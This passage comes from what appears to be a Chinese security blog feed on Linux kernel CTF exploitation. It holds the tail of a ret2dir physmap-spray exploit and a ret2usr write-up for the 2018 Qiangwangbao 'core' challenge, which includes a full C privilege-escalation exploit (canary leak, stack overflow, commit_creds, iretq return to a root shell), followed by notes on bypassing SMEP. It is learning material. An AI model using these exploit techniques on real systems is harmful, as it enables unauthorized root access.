class="number">0x4141414141414141</span>)&#123;</span><br><span class="line">                loglx(<span class="string">&quot;check change&quot;</span>,(u64)&amp;p[j]);</span><br><span class="line">                <span class="comment">/*x64dump((void *)&amp;p[j],0x20);*/</span></span><br><span class="line">                <span class="keyword">return</span> &amp;p[j];</span><br><span class="line">            &#125;</span><br><span class="line">            j+=<span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    </span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;raw_slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    slab_addr = slab_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        </span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        u64 addr_to_change;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBBBBBBBBBB&quot;</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = find_series(buf,<span class="number">0x1000</span>,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos!=<span class="number">-1</span>)&#123;</span><br><span class="line">            addr_to_change = addr + pos;</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line"></span><br><span class="line">            write_any(fd,addr_to_change,dirty,<span class="number">0x10</span>);</span><br><span class="line">            u64 *p = check();</span><br><span class="line">            <span class="keyword">if</span> (p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                loginfo(<span class="string">&quot;dirty success!&quot;</span>);</span><br><span class="line">                x64dump((<span class="type">char</span> *)p,<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后就能成功修改了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250309162954125.png"
                      class=""
                >

<p>这里这个case是采用内存搜索的方式进行寻找我们与用户空间相同的物理映射，实际上一般的kernel题不会有任意地址读取返回的内存搜索机会。一般而言我们可以直接在用户空间布置大量具有slide性质的rop链，然后靠溢出等漏洞劫持程序执行流返回到rop链。这里虽然说可能改用户态数据不好精确定位到内核中<strong>physmap</strong>的具体位置，但是由于该映射关系的存在，只要我们在内存中填满rop链，就有很高的概率能够执行我们想要的内容。在实际运用中，只要我们知道了内核的基地址，然后就能够直接劫持执行流到<strong>physmap</strong>的较高地址处。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2usr利用手法以及常见保护机制绕过浅析</title>
    <url>/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h2 id="ret2usr利用手法以及常见保护机制绕过浅析"><a href="#ret2usr利用手法以及常见保护机制绕过浅析" class="headerlink" title="ret2usr利用手法以及常见保护机制绕过浅析"></a>ret2usr利用手法以及常见保护机制绕过浅析</h2><h4 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h4><p>在SMAP、SMEP以及kpti保护未开启时，内核空间可以访问或执行用户空间的数据，那我们其实可以直接返回到用户空间执行函数，从而避免构造较为复杂的内核ROP链。</p>
<p>这里仍以<strong>2018 强网杯 - core</strong>为例，这题中虽然开了kaslr，但是我们不需要利用一些手法来泄露地址，init脚本中本身就给我们提供了一些利用点。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># init</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 120 -f &amp;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="comment"># setsid /bin/cttyhack setuidgid 0 /bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># poweroff -d 0  -f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>从init文件中我们可以看出<code>/proc/kallsyms</code>中存的符号信息被备份到了<code>/tmp/kallsyms</code>。这样一来<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>使普通用户无法查看确切的内核符号加载地址的措施就形同虚设了。那么之后我们写exp时就能够直接打开<code>/tmp/kallsyms</code>文件进行读取操作。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250228231014411.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117010705905.png"
                      class=""
                >

<p>然后就是看<strong>core.ko</strong>这个内核驱动模块的漏洞了。</p>
<p><strong>init_module</strong>注册了**&#x2F;proc&#x2F;core<strong>，</strong>exit_core<strong>删除了</strong>&#x2F;proc&#x2F;core**</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117144829081.png"
                      class=""
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117144951857.png"
                      class=""
                >

<p><strong>core_ioctl</strong>这个相当于堆题的菜单，有不同的功能选项。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145051360.png"
                      class=""
                >

<p><strong>core_read</strong>从 <code>v4[off]</code> 拷贝 64 个字节到a1，a1也就是后面我们可以传入的用户空间的一个缓冲区，而且全局变量 <code>off</code> 是我们能够控制的，因此可以合理的控制 <code>off</code> 来 将canary 和一些地址读取到用户空间的缓冲区，然后再自己把这个缓冲区内的内容输出，从而能泄露内核空间的一些地址。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145312844.png"
                      class=""
                >

<p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了。 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145441269.png"
                      class=""
                >

<p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了 </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250117145616435.png"
                      class=""
                >

<p>那我们可以首先靠读取<code>/tmp/kallsyms</code>来获取内核符号基址，然后可以直接劫持控制流到用户空间，用户空间则是提前布置调用内核函数的<code>commit_creds(prepare_kernel_cred(null))</code>，然后最后返回用户态执行system(“&#x2F;bin&#x2F;sh”)。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc ret2usr.c -static -masm=intel -g -o ret2usr</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getPrivilege</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301112049755.png"
                      class=""
                >

<p>这个exp是参照了ctfwiki上的exp，这时我有个疑问就是为什么即使可以直接执行用户空间的代码，最后还需要<code>swapgs; popfq; ret;</code>以及<code>iretq; ret</code>着陆用户态呢，如果直接返回到system(“&#x2F;bin&#x2F;sh”)又会发生什么呢？</p>
<p>这里我们把rop缩短至如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301143500459.png"
                      class=""
                >

<p>然后到我们主程序的spawn_shell中就内核就panic了，第一个call这里也就是getuid这个libc函数的调用。这里即使我们去除掉getuid的判断，system函数调用还是会崩溃。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301144122307.png"
                      class=""
                >

<p>如果<strong>控制了内核态的 RIP</strong>，并且直接让 <code>RIP</code> 指向 <code>system(&quot;/bin/sh&quot;)</code> 这样的 libc 函数，会发生以下情况：</p>
<ol>
<li><strong>system() 仍然在内核态运行</strong><ul>
<li><code>system(&quot;/bin/sh&quot;)</code> 这个函数是用户态的 libc 代码，执行时它会认为自己仍然在 Ring 3（但实际上是 Ring 0）。</li>
<li><strong>因为没有切换回用户态，进程仍然在 Ring 0 执行</strong>，但 libc 代码假设它在用户态，可能会导致非法访问内核地址，或者崩溃。</li>
</ul>
</li>
<li><strong>可能访问非法地址</strong><ul>
<li><code>system()</code> 需要用户态的栈，如果它访问用户态的 <code>RSP</code>，但 <code>RSP</code> 仍然是内核态栈，可能会导致崩溃。</li>
</ul>
</li>
<li><strong>可能执行 <code>syscall</code>，导致未知行为</strong><ul>
<li><code>system()</code> 依赖 <code>execve()</code>，会执行 <code>syscall</code>，但 <strong>在内核态执行 <code>syscall</code> 会导致崩溃</strong>，因为 <code>syscall</code> 只能从用户态触发。</li>
</ul>
</li>
</ol>
<p>所以我们完成提权后还需着陆用户态。</p>
<h4 id="smep保护绕过"><a href="#smep保护绕过" class="headerlink" title="smep保护绕过"></a>smep保护绕过</h4><p>首先我们要了解smep保护开启与否与CR4寄存器的值密切相关。当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301145351542.png"
                      class=""
                >

<p>但是如果我们开启了smep保护，上述exp就不能成功运行了。首先要开启smep，就可以简单的在启动文件里面的<code>-cpu</code>选项中加上一个<code>+smep</code>即可。而且如果想在cpu选项开启smep或smap保护，都需要先明确指定cpu模型。</p>
